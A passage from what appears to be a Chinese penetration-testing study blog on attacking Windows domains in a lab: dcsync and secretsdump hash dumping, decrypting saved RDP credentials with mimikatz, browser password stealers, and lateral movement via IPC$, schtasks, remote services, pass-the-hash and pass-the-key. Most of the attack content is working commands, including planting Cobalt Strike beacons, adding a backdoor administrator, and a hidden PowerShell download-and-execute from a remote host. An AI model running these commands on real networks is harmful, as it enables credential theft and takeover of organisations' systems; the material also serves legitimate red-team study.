组内的用户</li><li>2.Domain Admins 组内的用户</li><li>3.Enterprise Admins 组内的用户</li><li>4.域控制器的计算机帐户</li><li>5.域控 system</li></ul><h3 id="dcsync-远程读取域控-hash"><a href="#dcsync-远程读取域控-hash" class="headerlink" title="dcsync 远程读取域控 hash"></a>dcsync 远程读取域控 hash</h3><p>需要找到一个可以运行 drs 服务的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:gouzi.com /all /csv&quot; &quot;exit&quot;&gt;1.txt</span><br></pre></td></tr></table></figure><p>如果权限不够则出现下面的提示<br><img src="https://i.imgur.com/0VXCL0g.png"></p><p>secretsdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell secretsdump.exe 域名/administrator:密码@ip</span><br><span class="line"></span><br><span class="line">shell secretsdump.exe gouzi/administrator:admin123@192.168.192.10</span><br></pre></td></tr></table></figure><h3 id="dcsync-远程读取明文密码"><a href="#dcsync-远程读取明文密码" class="headerlink" title="dcsync 远程读取明文密码"></a>dcsync 远程读取明文密码</h3><p>其实有 HASH 足够了，但是如果在创建用户的时候勾选了”使用可逆加密存储密码”的属性，那么 dcsync 就可以直接读取出明文账号密码。</p><h2 id="RDP-密码抓取"><a href="#RDP-密码抓取" class="headerlink" title="RDP 密码抓取"></a>RDP 密码抓取</h2><p>原理</p><p>在平时的工作中，管理员为了方便管理计算机，经常会进行远程桌面连接，由于每次都需要输入密码觉得麻烦，就点击了保留凭据，这个过程是可逆，所以我们可以将保存的密码进行还原。</p><p>开启远程 3389</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber 查看 RDP 端口(<span class="number">0</span>xd3d 为 <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f 开启</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f 关闭</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :查看 RDP 凭据（可破解明文账号密码）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还原的原理：Windows 通过 MasterKey 将密码加密后保存在本地，由于 Windows还需要解密使用这个密码，所以这个过程是可逆，也正因为这一缘由，我们只要拿到 MasterKey 就能将密码解出来。</p><p>寻找、查看 RDP 凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看 RDP 连接记录</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">查找本地 Credentials</span><br><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/I8Ankov.png"></p><p>在线读取</p><p>1、读取凭据,找到 Matserkey 的 guid 值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/OOtsn6J.png" alt="x|700x250"></p><ul><li>36100E4F8DF719F103EAECB55C8B2DBB</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vMBRWdY.png" alt="x|700x250"></p><ul><li>确认guid:{6306f025-f7b1-4720-85b6-63394deeae61}</li></ul><p>2、根据 guid 找到内存中的 Materkey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fxAD4BT.png" alt="x|900x400"><br><img src="https://i.imgur.com/8A4xmVl.png" alt="x|900x250"></p><ul><li>MasterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</li></ul><p>3、利用 masterkey 值解密 RDP 凭据密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB /masterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/skX6GcZ.png" alt="x|700x250"><br><img src="https://i.imgur.com/ujDA0HP.png" alt="x|700x250"></p><ul><li>破解出账号密码</li></ul><h2 id="应用软件密码抓取"><a href="#应用软件密码抓取" class="headerlink" title="应用软件密码抓取"></a>应用软件密码抓取</h2><h3 id="浏览器密码抓取"><a href="#浏览器密码抓取" class="headerlink" title="浏览器密码抓取"></a>浏览器密码抓取</h3><p>浏览器中保存着账号密码、历史记录、书签等重要信息，这些信息对内网渗透也很重要。</p><p>下面两种工具皆为直接运行即可，使用方法非常简单，原理就是找到浏览器保存数据的路径，然后解密。</p><p>1、BrowserGhost</p><p>可抓取浏览器密码，实现 system 抓机器上其他用户的浏览器密码。主要针对谷歌。</p><p>地址：<a href="https://github.com/QAX-A-TEAM/BrowserGhost">https://github.com/QAX-A-TEAM/BrowserGhost</a></p><p>2、Sharp-HackBrowserData</p><p>可抓取谷歌、火狐、IE 等常见浏览器的密码。</p><p>地址:<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>3、其他软件密码抓取</p><ul><li>SharpDecryptPwd-master 对密码已保存在 Windows 系统上的部分程序进行解析，包括 Navicat,TeamViewer,FileZilla,VinSCP,Xmangager 系列产品</li><li>LaZagne是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（明文、AP、自定义算法、数据库等)存储其密码。开发此工具的目的是为最常用的软件查找这些密码。以上工具 CS 插件中集成。</li></ul><h2 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h2><p>在内网渗透中，域内横向移动是一种常见的攻击手法。攻击者会利用此技术，以被攻陷的系统为跳板，访问域内其他主机，扩大资产(包括跳板机中的文档和存储的凭证，以及通过跳板机连接的数据库，域控制器等其他重要资产)。通过此类攻击技术，攻击者最终很可能获取到域控制器的访问权限，甚至控制整个内网的机器权限。</p><p>横向移动的目标一般需要选择具有价值的机器，例如域控、域管理员登录过的服务器、运维机器、文件服务器、数据库服务器、OA 系统服务器、重要个人电脑等。</p><p>横向移动常见的方法：<br>• WEB 漏洞<br>• 系统漏洞<br>• 远程桌面<br>• 账号密码（PTH、PTT、PTK、WMIC…）<br>• 不安全的配置（比如 dcsync 滥用、委派滥用）</p><h3 id="远控软件"><a href="#远控软件" class="headerlink" title="远控软件"></a>远控软件</h3><p>为了图形化控制对方机器。</p><h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>远程桌面协议(RDP)是一个多通道(multi-.channel)的协议，让使用者（所在计算机称为用户端或’本地计算机)连上提供微软终端机服务的计算机（称为服务端或’远程计算机’）远程桌面的利用条件：</p><p>1、开启了 3389 端口</p><p>2、防火墙等安全设备没有禁止</p><p>3、网络畅通</p><p>4、拥有账号和密码或者 Hash，（可以是本身的账号也可以是自己添加的)</p><p>方法一：</p><p>查询注册表 查看 RDP 端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; /v PortNumber   查看 RDP 端口(0xd3d 为 3389)</span><br></pre></td></tr></table></figure><p>查看 RDP 功能是否启用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>如果未启用 修改注册表启用 RDP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>抓取机器明文密码登录即可:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>方式二：</p><p>借助 mimikatz 使用 hash 登录(属于 pth 的一种):</p><p>查询注册表，看看是否开启 Restricted Admin mode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\System\CurrentControlSet\Control\Lsa</span><br></pre></td></tr></table></figure><p>开启 Restricted Admin mode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>privilege::debug</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:zs /domain:192.168.197.20 /ntlm:f31f1532113ca4a22e0a87426713d565&quot; /run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><ul><li>注意，使用 rdp 的 pth 攻击时，关于 RestrictedAdmin Mode 的使用，需</li></ul><p>要连接双方都支持该功能。（自 Windows8.1 之后支持该功能，如果</p><p>WS2012 等，但是部分家庭版不支持，如 win10 家庭版）</p><p>方式三：</p><p>创建账户进行远程桌面连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack@123 /add</span><br><span class="line"></span><br><span class="line">net localgroup Administrators hack /add</span><br></pre></td></tr></table></figure><p>RDP 登录之后可以查看当前机器 RDP 记录、SSH 连接程序等，如果有则直接横向</p><h2 id="IPC-横向移动"><a href="#IPC-横向移动" class="headerlink" title="IPC$横向移动"></a>IPC$横向移动</h2><h3 id="概述和连接方式"><a href="#概述和连接方式" class="headerlink" title="概述和连接方式"></a>概述和连接方式</h3><p>IPC(Internet Process Connection)共享，是为了实现进程间通信而开放的命名管道。</p><p>IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。通过 ipc$,可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p><p>文件共享是指主动在网络上共享自己的计算机文件。而每台计算机都会有默认共享的情况，包括所有的逻辑盘（C$、D$、E$、admin$），只需要知道对方的账号密码，可以实现对这些默认共享目录的访问。而如果当前用户的账号是 administrator，目标机器的账户 administrator密码与当前用户的一致，不需要输入密码就可以访问，默认会用本地相同的账号密码进行认证。(非最高管理员权限不够，提示拒绝访问。)</p><p>&#x3D;&#x3D;而在内网中，可能存在很多机器的本地 administrator 用户密码是一样的，所以能够直接利用。&#x3D;&#x3D;</p><p>如果双方建立了 IPC 连接，则共享文件无需再进行认证。</p><p>关于 IPC 的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">建立 IPC 连接</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;password&quot; /user:username</span><br><span class="line"></span><br><span class="line">net use \\域名\ipc$ &quot;password&quot; /user:域用户</span><br><span class="line"></span><br><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ezYAnTB.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除 ipc 连接</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ /del</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Sgg8BQc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">关闭共享</span><br><span class="line"></span><br><span class="line">net share IPC$ /del</span><br><span class="line"></span><br><span class="line">开启共享</span><br><span class="line"></span><br><span class="line">net share IPC$</span><br><span class="line"></span><br><span class="line">自定义共享</span><br><span class="line"></span><br><span class="line">net share kzh=C</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE] 利用条件</p><ol><li>开启了 139、445 端口<ul><li>iPC$可以实现远程登录及对默认共享资源的访问，445 端口可以实现对共享文件打印机的访问。因此，一般来讲需要 445 端口的支持。</li></ul></li><li>管理员开启了默认共享 <ul><li>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c$、d$、e$、admin$)可以实现对这些默认共享目录的访问(net share)</li></ul></li><li>必须知道对方机器的用户名和密码</li></ol></blockquote><p>不同用户 ipc$的命令权限,ipc 连接建立之后可以执行很多命令，如：</p><ul><li><code>tasklist /S ip</code>  查看进程<ul><li><img src="https://i.imgur.com/WtqXDYl.png" alt="x|600x250"></li></ul></li><li><code>dir \\ip\c$</code>  列目录<ul><li><img src="https://i.imgur.com/iPZ1EbK.png" alt="x|600x250"></li></ul></li><li><code>type \\ip\c$\1.exe</code>  查看文件<ul><li><img src="https://i.imgur.com/lqcOQaW.png"></li></ul></li><li><code>copy 1.exe \\ip\c$</code>  复制文件<ul><li><img src="https://i.imgur.com/P43vKKI.png"></li></ul></li></ul><p>排除本机的影响，对于不同目标用户建立 ipc 连接权限是不一样的，大致如下：</p><table><thead><tr><th>命令</th><th>域</th><th>域管理员</th><th>域内用户</th><th>本地</th><th>本地管理员</th><th>本地用户</th></tr></thead><tbody><tr><td>dir、type</td><td>√</td><td>√</td><td>×</td><td>√</td><td>×</td><td>×</td></tr><tr><td>copy</td><td>√</td><td>√</td><td>×</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><blockquote><p>[!NOTE] 一点例外<br>在Windows Server 2003及老版本的Windows电脑中，使用普通管理员进行IPC连接之后即可对文件进行操作(如dir copy type)</p></blockquote><blockquote><p>[!NOTE]</p><p>域成员-&gt;域管理员：<br><img src="https://i.imgur.com/r2iH9O2.png"></p><p>本地-&gt;域管理员<br><img src="https://i.imgur.com/TqAaVQw.png"></p><p>本地-&gt;域成员<br><img src="https://i.imgur.com/agv2eNC.png"></p></blockquote><h3 id="ipc-配合计划任务"><a href="#ipc-配合计划任务" class="headerlink" title="ipc$配合计划任务"></a>ipc$配合计划任务</h3><p>如果我们能以高权限用户和域内其他主机建立 ipc 连接，那么就可以将木马上传至其他主机中，这时只要执行这个木马即可使其他主机上线，而使用计划任务，可以执行程序。</p><p>在 Windows XP 之前使用 at 命令创建计划任务，之后使用 schtasks 命令。</p><p>计划任务是允许远程创建的，也就是说 A 机器可以在 B 机器上创建计划任务，前提是需要账号密码。但是 at 命令不需要。</p><p>注意，&#x3D;&#x3D;建立 IPC 连接和创建计划任务最好不要使用 CS 上的 systemshell。&#x3D;&#x3D;</p><ol><li>首先创建 ipc 连接，复制木马至目标主机（注意，最好不要用 system 用户，可能会出错）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br><span class="line"></span><br><span class="line">copy artifact2.exe \\192.168.255.10\c$\ls.exe</span><br></pre></td></tr></table></figure></li></ol><ul><li>开启ipc服务</li><li>上传cs的木马exe程序到目标主机<br><img src="https://i.imgur.com/G8MAg7N.png"></li></ul><ol start="2"><li>创建计划任务。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru system /F</span><br></pre></td></tr></table></figure></li></ol><ul><li>不过并不建议使用system的shell，最好使用 administrator 权限，不然不好继续使用 ipc 横向。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru administrator /F</span><br></pre></td></tr></table></figure></li><li>使用administrator权限创建计划任务</li><li>计划任务名为updateWindows</li><li>启动频率设置为onstart，即开机自启动<br><img src="https://i.imgur.com/jSsAnzD.png"></li></ul><ol start="3"><li><p>运行计划任务上线。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.255.10 /u administrator /p Win.2024 /i /tn updateWindows</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ii27JG8.png"><br>很快cs就回显上线了<br><img src="https://i.imgur.com/zh6Qw9P.png"></p></li><li><p>删除计划任务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /f</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ProY53j.png"></p></li></ol><h3 id="ipc-配合服务"><a href="#ipc-配合服务" class="headerlink" title="ipc$配合服务"></a>ipc$配合服务</h3><p>建立 ipc 连接之后，还可以直接远程创建服务上线木马。创建服务 test 并且指定执行路径 注意<code>=</code>右边需要有一个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 create test binpath= &quot;cmd.exe /c c:C:\Users\Administrator\Desktop\artifact2.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/wYhe535.png"></p><ul><li>使用sc远程创建名为test的服务</li><li>启动时将调用 <code>cmd.exe /c C:\Users\Administrator\Desktop\artifact2.exe</code> 来执行桌面上的文件</li></ul><p>powershell 上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\dc.kea.com create test1 binpath= &quot;cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadsrting(&#x27;http://192.168.31.212/1.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 start test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/cVffkuw.png" alt="x|950x150"></p><ul><li>似乎报错？但服务成功上线了<br><img src="https://i.imgur.com/aOjJgmH.png" alt="x|950x400"></li></ul><p>删除服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.197.30 delete test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/YlQjErK.png"></p><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>PTH 攻击，也就是哈希传递攻击，是一种在内网渗透中常见的攻击手段。</p><p>想象一下，你有一个带锁的箱子，这个箱子用一把钥匙来打开。但是，你并没有这把钥匙，而是拿到了一个这把钥匙的“指纹”（也就是这个钥匙的某种独特特征的数字化表示，但不是钥匙本身）。虽然你没有钥匙，但只要你找到了一个能识别这个“指纹”的锁（或者是一个能被这个“指纹”欺骗的系统），你就能打开这个箱子。</p><p>在 PTH 攻击中，这个“箱子”就是受保护的计算机系统或资源，“钥匙”就是用户的明文密码，而“指纹”就是密码的哈希值。</p><p>具体来说，在域环境中（比如公司或组织内部的网络环境），&#x3D;&#x3D;用户登录计算机时通常使用域账号，而且很多计算机在安装时会使用相同的本地管理员账号和密码&#x3D;&#x3D;。如果攻击者获取到了这个本地管理员账号的哈希值，他就可以使用这个哈希值来登录内网中的其他计算机，就像他自己是那个管理员一样。</p><p>PTH 攻击前提：<br>• 目标机器开放 445 端口。<br>• 具备管理员的 NTLM 哈希值，并且目标使用了同样的账号密码。</p><h3 id="不同用户权限区别"><a href="#不同用户权限区别" class="headerlink" title="不同用户权限区别"></a>不同用户权限区别</h3><p>以下均讨论默认情况。</p><ul><li>本地用户:而 Windows2003、Windows XP、Windows visaa 可以使用普通管理员用户进行PTH 攻击。Windows2003 之后的机器，只能使用 administrator 用户进行 PTH 攻击。</li><li>域用户:对于域最高管理员 administrator、Domain Admins 组中的域管理员用户，都可以进行 PTH 攻击。但是域内普通用户不可以。</li></ul><h3 id="Hash-碰撞查询可用-PTH"><a href="#Hash-碰撞查询可用-PTH" class="headerlink" title="Hash 碰撞查询可用 PTH"></a>Hash 碰撞查询可用 PTH</h3><p>PTH 传递除了权限要求之外，还有一个重要前提就是双方的用户名密码一致，那</p><p>如何得知拥有相同账号密码的机器，其实不用知道，全部跑一遍就行了。</p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure><p>这里使用域成员机192.168.255.10连接到域控192.168.255.4</p><p>获取到目标机器的hash<br><img src="https://i.imgur.com/rDJoOt6.png" alt="700"></p><ul><li>hash:8f43b30edfe321e2fb2d2c227ef35993</li></ul><p>到域控机执行mimikatz命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user Administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/peoiNeH.png"></p><p>之后会弹出一个 shell，该 shell 已经和目标主机已经建立了认证，&#x3D;&#x3D;该认证通过之后可以远程创建、执行计划任务和服务&#x3D;&#x3D;，从而我们可以直接上线。image-20241108145245337<br><img src="https://i.imgur.com/BJS0Huk.png"></p><p>如下所示（远程创建服务也可以）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy beacon_x64.exe \\192.168.197.40\c$\b.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.197.40 /tn test /tr c:\b.exe /Ru administrator /sc onstart /F</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.197.40 /tn test /i</span><br></pre></td></tr></table></figure><h4 id="CS-PTH-上线"><a href="#CS-PTH-上线" class="headerlink" title="CS PTH 上线"></a>CS PTH 上线</h4><p>通过学习我们知道了 PTH,本质是上认证，之前学习过的 IPC$连接是通过账号密码进行认证的。</p><p>PTH 是通过账号和 hash 值进行认证的，但是光认证还是不够的，认证通过之后还需要配合上传，计划任务，服务等其他的操作进行上线，CS 支持 jump 命令，配合 psexec 一键上线。</p><p><img src="https://i.imgur.com/hynbYKc.png"></p><p><img src="https://i.imgur.com/KDXQ6IY.png" alt="600"></p><ul><li>前三项是选定本地抓取到的凭证，选择要上线的目标用户凭证,domian项这里注意还是填写目标ip地址好些</li><li>第四项选择使用的监听器</li><li>第五项选择通过哪个机器&#x2F;用户进行传递</li><li>这里是使用192.168.255.4横向移动到192.168.255.10上线</li></ul><p>所执行的操作<br><img src="https://i.imgur.com/GSsXqbW.png" alt="800"><br><img src="https://i.imgur.com/x3wNcTf.png" alt="800"></p><p>成功上线<br><img src="https://i.imgur.com/kRxn3tc.png"></p><h4 id="CractMapExec批量-pth"><a href="#CractMapExec批量-pth" class="headerlink" title="CractMapExec批量 pth"></a>CractMapExec批量 pth</h4><p>这里需要使用 LM:NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackMapexec.exe 192.168.197.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:35a2fedaa43b5f18e4ed98f3cf70c092</span><br></pre></td></tr></table></figure><p>这里选用192.168.255.10的LM:NTLM<br><img src="https://i.imgur.com/DF1HGcu.png"></p><ul><li>获得hash：aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7IHwreX.png" alt="1200"><br>这工具自己的环境只测试 普通用户，不去测本地的 administrator，故而全部失败。</p><p>解决方式。</p><ul><li>指定-d 参数时，如果域名不存在那么就会测试本地用户。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993 -d local</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/AsePSeD.png" alt="1200"></li></ul><p>后续使用192.168.255.4中用户的hash<br><img src="https://i.imgur.com/5ZFg60n.png" alt="1200"></p><ul><li>获得hash：aad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/pqFpKy4.png" alt="1200"></p><h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>PTK(Pass The key)),中文叫秘钥传递攻击，PTH 传递中，使用的是 NTLM-HASH 值进行认证，PTK 使用 AES256 或者 AES128 的方式进行传递，PTK 攻击只能用于kerberos 认证中，NTLM 认证中不存在这一攻击手法。</p><p>在 kerberos 认证中，其中 AS-REQ 数据包中的 PA-DATA- pc-ENC-TIMESTAMP 中的数据是进行加密的，加密的方式由 etype 决定，可以选择使用用户 HASH 加密或者 AES key 加密，所以会产生 PTH 和 PTK 攻击。</p><p>AES KEY 又分为 256 位和 128 位。AES-KEY 只在 kerberos 认证中使用，所以一般域用户才会有该值。</p><p>可以使用 <code>mimikatz “privilege::debug” “sekurlsa::ekeys”</code> 读取 AES key。</p><p>如果在域内机器中使用该命令，可能会抓到机器用户的 AES Key。</p><p>利用条件<br>1、必须是域环境，使用域账号才能进行 PTK 攻击。<br>2、kerberos 支持 AES 认证。</p><p>使用 impacket-psexec 完成 PTK 攻击:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全域名/用户名@域名地址 -aeskey xxx</span><br><span class="line"></span><br><span class="line">gouzi.com/dadmin@dc.gouzi.com -aesKey 8cac5b0cf475d11099d7d9f787f02fac304227bc3b0ae6dab20a318317bfc065</span><br></pre></td></tr></table></figure><p>246951e5d9a1233b12117c071830d76d2ae8b6e5b509a3b848e21838cc85100c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/Adminitrator.kea.com -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure><p>dadmin 是一个域管账号,这里使用普通域用户可能会失败。</p><h4 id="PTK-上线-CS"><a href="#PTK-上线-CS" class="headerlink" title="PTK 上线 CS"></a>PTK 上线 